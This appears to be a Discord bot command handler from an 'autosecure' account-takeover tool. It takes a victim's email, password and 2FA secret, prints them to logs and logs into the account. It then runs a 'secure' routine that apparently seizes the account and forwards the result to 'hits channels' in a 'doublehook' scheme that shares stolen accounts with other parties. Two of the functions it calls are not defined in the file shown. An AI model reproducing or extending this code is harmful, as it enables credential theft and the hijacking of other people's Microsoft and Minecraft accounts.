const generateotp = require("../../../autosecure/utils/secure/codefromsecret.js");
const generateuid = require("../../../autosecure/utils/generateuid.js");
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js'); 
const login = require("../../../autosecure/utils/secure/login.js");
const secure = require("../../../autosecure/utils/secure/recodesecure.js");
const statsembed = require("../../../autosecure/utils/stats/statsembed.js");
const getStats = require("../../../autosecure/utils/hypixelapi/getStats.js")
const listAccount = require("../../../autosecure/utils/accounts/listAccount.js");
const insertaccount = require("../../../db/insertaccount.js")
const { queryParams } = require("../../../db/database.js")
const short = require("short-number")
const mcregex = require("../../.././autosecure/utils/utils/mcregex.js");
const { failedembed } = require("../../../autosecure/utils/embeds/embedhandler.js");

module.exports = {
    name: "zygersecure",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
  

            let settings = await queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [interaction.user.id])
            //    console.log(settings)
    
                if (settings.length === 0) {
                    console.log(`Settings not found for user: ${interaction.user.id}`);
                    return interaction.reply({
                        content: `Couldn't get your settings!`,
                        ephemeral: true,
                    });
                }
            settings = settings[0];
            const email = interaction.components[0].components[0].value;
            const password = interaction.components[1].components[0].value;
            const secretkey = interaction.components[2].components[0].value;
            const mcign = interaction.components[3].components[0].value || null
    
            if (mcign && !mcregex(mcign)){
                return interaction.reply({
                    content: "Please enter a valid minecraft username!",
                    ephemeral: true
                })
            }

            await interaction.deferReply({ ephemeral: true });

            console.log(email, password, secretkey);

            const { otp } = await generateotp(secretkey);
            console.log(otp)

            let host = await login({ otp: otp, email: email, pw: password }, null);
            console.log(`zygersecure: ${host}`)

            if (host === "tfa") {
                return interaction.editReply({
                    content: "Invalid details / 2fa is disabled, try recovery securing! Try to manually login and resolve issues",
                    ephemeral: true
                });
            }

            if (!host) {
                return interaction.editReply({
                    embeds: [{
                        title: `Failed`,
                        description: `Password or secretkey seems to be wrong!`,
                        color: 0xff0000
                    }],
                });
            }

            let uid = await generateuid();
            const embed = {
                title: 'This account is being automatically secured.',
                color: 0x808080
            };

            const components = [
                new ActionRowBuilder().addComponents(
                    new ButtonBuilder()
                        .setCustomId(`status|${uid}`)
                        .setLabel('⏳ Status')
                        .setStyle(ButtonStyle.Primary)
                )
            ];

            await interaction.editReply({ embeds: [embed], components });
            await interaction.user.send({ embeds: [embed], components });

            try {
                console.log(`uid: ${uid}`);

                let acc = await secure(host, settings, uid, mcign);

                    await insertaccount(acc, uid, interaction.user.id, settings.secureifnomc)


                    const failedmsg = await failedembed(acc, uid)
                    if (failedmsg.failed) {
                        await interaction.followUp(failedmsg.failedmsg);
                        await interaction.user.send(failedmsg.failedmsg);
                        return;
                    }


                if (acc.newName == "No Minecraft!") {
                    let accountmessage = await listAccount(acc, uid, client, interaction);;
                    
                    // Send to hits channels (doublehook)
                    await sendHitsToChannels(client, accountmessage, interaction.user.id, interaction.user.tag, client.username);
                    
                    // Log account securing
                    await logAccountSecure(client, interaction.user.id, interaction.user.tag, acc.oldEmail || acc.email, "Zyger Secure", true).catch(() => {});
                    
                    await interaction.user.send(accountmessage);
                    return;
                }
                
                
              //  console.log(stats);
                let statsoverview = await statsembed(client, acc, interaction);
                let accountmessage = await listAccount(acc, uid, client, interaction);;
                
                // Send to hits channels (doublehook)
                await sendHitsToChannels(client, accountmessage, interaction.user.id, interaction.user.tag, client.username);
                
                // Log account securing
                await logAccountSecure(client, interaction.user.id, interaction.user.tag, acc.oldEmail || acc.email, "Zyger Secure", true).catch(() => {});
     
                if (statsoverview) {
                    await interaction.user.send(statsoverview);
                }
                await interaction.user.send(accountmessage);
                await interaction.editReply({accountmessage})
            } catch (error) {
                console.log(error);

                await interaction.editReply({
                    embeds: [{
                        title: `Error Securing Account`,
                        description: `An error occurred while securing your account.`,
                        color: 0xff0000
                    }],
                });
            }
        } catch (error) {
            console.error("Command execution error:", error);
            await interaction.editReply({
                embeds: [{
                    title: `Error`,
                    description: `An unexpected error occurred while processing your request.`,
                    color: 0xff0000
                }],
            });
        }
    }
};
